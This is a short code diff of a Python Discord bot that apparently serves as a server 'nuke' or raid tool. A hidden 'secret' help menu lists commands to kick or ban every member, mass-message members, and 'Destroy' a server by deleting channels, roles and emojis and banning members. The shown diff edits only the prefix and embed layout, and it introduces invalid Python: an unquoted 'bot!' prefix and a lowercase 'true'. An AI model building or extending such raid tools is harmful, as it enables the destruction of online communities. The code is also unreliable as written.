@@ -12,7 +12,7 @@ import os
 intents = discord.Intents(messages=True, guilds=True, members=True)
 # Imports the needed libs.
 
-client = commands.Bot(command_prefix=prefix, intents=intents)
+client = commands.Bot(command_prefix=bot!, intents=intents)
 # Sets prefix and intents
 
 client.remove_command("help")
@@ -36,11 +36,11 @@ async def secret(ctx):
     )
 
     embed.set_author(name='Secret')
-    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
-    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
+    embed.add_field(name='Kall', value='Kicks every member in a server', inline=true)
+    embed.add_field(name='Ball', value='Bans every member in a server', inline=true)
     embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
     embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
-    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
+    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=true)
     embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
     embed.add_field(name='Info', value='Gives information of a user', inline=False)
     await member.send(embed=embed)
